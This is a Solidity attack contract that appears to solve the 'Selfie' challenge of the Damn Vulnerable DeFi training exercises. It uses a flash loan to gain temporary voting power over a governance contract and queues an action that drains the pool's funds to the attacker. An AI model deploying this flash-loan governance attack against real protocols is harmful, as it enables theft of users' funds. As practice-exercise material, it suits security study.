// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract SelfieAttacker {

    address owner;
    DamnValuableTokenSnapshot token;
    address governance;
    address flashPool;
    uint256 actionId; // id of the malicious action

    constructor(address _token, address _flashPool, address _governance) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(_token);
        flashPool = _flashPool;
        governance = _governance;
    }

    function attack() public returns (uint256) {
        require(msg.sender == address(owner));
        flashPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                token.balanceOf(flashPool)
            )
        );
        return actionId;
    }

    function receiveTokens(address _tokenAddress, uint256 amount) public {
        require(msg.sender == address(flashPool));

        // take a snapshot now that we have the tokens
        token.snapshot();

        bytes memory drainFundsData = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner)
        );

        console.log("about to log the governance response");
        (bool _success, bytes memory returndata) = governance.call(
            abi.encodeWithSignature(
                "queueAction(address,bytes,uint256)",
                address(flashPool),
                drainFundsData,
                0
            )
        );
        actionId = abi.decode(returndata, (uint256));

        // transfer funds back
        token.transfer(flashPool, amount);
    }
}
